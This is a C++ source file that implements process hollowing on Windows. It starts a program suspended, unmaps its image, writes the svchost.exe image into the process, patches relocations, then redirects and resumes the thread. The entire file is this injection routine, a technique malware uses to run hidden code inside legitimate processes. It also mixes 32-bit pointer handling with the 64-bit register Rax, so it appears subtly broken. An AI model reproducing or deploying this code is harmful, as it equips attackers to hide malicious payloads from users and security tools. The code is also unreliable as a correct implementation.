#include <iostream>
#include <Windows.h>
#include <winternl.h>

#pragma comment( lib, "ntdll" )
using NtUnmapViewOfSection = NTSTATUS(WINAPI*)(HANDLE, PVOID);

typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

int main()
{
	LPSTARTUPINFOA startupInfo = new STARTUPINFOA();
	LPPROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();
	PROCESS_BASIC_INFORMATION *processBasicInfo = new PROCESS_BASIC_INFORMATION();
	DWORD length = 0;
	CreateProcessA(NULL, (LPSTR)"c:\\pub\\msgbox.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, startupInfo, processInfo);
	HANDLE target = processInfo->hProcess;

	NtQueryInformationProcess(target, ProcessBasicInformation, processBasicInfo, sizeof(PROCESS_BASIC_INFORMATION), &length);
	DWORD pebImageBaseOffset = (DWORD)processBasicInfo->PebBaseAddress + 8; 
	
	LPVOID targetImageBase = 0;
	SIZE_T bytesRead = NULL;
	ReadProcessMemory(target, (LPCVOID)pebImageBaseOffset, &targetImageBase, 4, &bytesRead);

	HANDLE sourceFile = CreateFileA("C:\\windows\\system32\\svchost.exe", GENERIC_READ,	NULL, NULL, OPEN_ALWAYS, NULL, NULL);
	DWORD sourceFileSize = GetFileSize(sourceFile, NULL);
	SIZE_T fileBytesRead = 0;
	LPVOID sourceFileBytesBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sourceFileSize);
	ReadFile(sourceFile, sourceFileBytesBuffer, sourceFileSize, NULL, NULL);
	
	PIMAGE_DOS_HEADER sourceImageDosHeaders = (PIMAGE_DOS_HEADER)sourceFileBytesBuffer;
	PIMAGE_NT_HEADERS sourceImageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew);
	SIZE_T sourceImageSize = sourceImageNTHeaders->OptionalHeader.SizeOfImage;

	NtUnmapViewOfSection myNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"));
	myNtUnmapViewOfSection(target, targetImageBase);

	LPVOID newtargetImageBase = VirtualAllocEx(target, targetImageBase, sourceImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	targetImageBase = newtargetImageBase;

	DWORD deltaImageBase = (DWORD)targetImageBase - sourceImageNTHeaders->OptionalHeader.ImageBase;

	sourceImageNTHeaders->OptionalHeader.ImageBase = (DWORD)targetImageBase;
	WriteProcessMemory(target, newtargetImageBase, sourceFileBytesBuffer, sourceImageNTHeaders->OptionalHeader.SizeOfHeaders, NULL);

	PIMAGE_SECTION_HEADER sourceImageSection = (PIMAGE_SECTION_HEADER)((DWORD)sourceFileBytesBuffer + sourceImageDosHeaders->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
	PIMAGE_SECTION_HEADER sourceImageSectionOld = sourceImageSection;
	int err = GetLastError();

	for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++)
	{
		PVOID destinationSectionLocation = (PVOID)((DWORD)targetImageBase + sourceImageSection->VirtualAddress);
		PVOID sourceSectionLocation = (PVOID)((DWORD)sourceFileBytesBuffer + sourceImageSection->PointerToRawData);
		WriteProcessMemory(target, destinationSectionLocation, sourceSectionLocation, sourceImageSection->SizeOfRawData, NULL);
		sourceImageSection++;
	}

	// get address of the relocation table
	IMAGE_DATA_DIRECTORY relocationTable = sourceImageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	
	// patch the binary with relocations
	sourceImageSection = sourceImageSectionOld;
	for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++)
	{
		BYTE* relocSectionName = (BYTE*)".reloc";
		if (memcmp(sourceImageSection->Name, relocSectionName, 5) != 0) 
		{
			sourceImageSection++;
			continue;
		}

		DWORD sourceRelocationTableRaw = sourceImageSection->PointerToRawData;
		DWORD relocationOffset = 0;

		while (relocationOffset < relocationTable.Size) {
			PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)((DWORD)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset);
			relocationOffset += sizeof(BASE_RELOCATION_BLOCK);
			DWORD relocationEntryCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
			PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)((DWORD)sourceFileBytesBuffer + sourceRelocationTableRaw + relocationOffset);

			for (DWORD y = 0; y < relocationEntryCount; y++)
			{
				relocationOffset += sizeof(BASE_RELOCATION_ENTRY);

				if (relocationEntries[y].Type == 0)
				{
					continue;
				}

				DWORD patchAddress = relocationBlock->PageAddress + relocationEntries[y].Offset;
				DWORD patchedBuffer = 0;
				ReadProcessMemory(target,(LPCVOID)((DWORD)targetImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), &bytesRead);
				patchedBuffer += deltaImageBase;

				WriteProcessMemory(target,	(PVOID)((DWORD)targetImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), &fileBytesRead);
				int a = GetLastError();
			}
		}
	}

	LPCONTEXT context = new CONTEXT();
	context->ContextFlags = CONTEXT_INTEGER;
	GetThreadContext(processInfo->hThread, context);

	DWORD patchedEntryPoint = (DWORD)targetImageBase + sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint;
	context->Rax = patchedEntryPoint;
	SetThreadContext(processInfo->hThread, context);
	ResumeThread(processInfo->hThread);

	return 0;
}

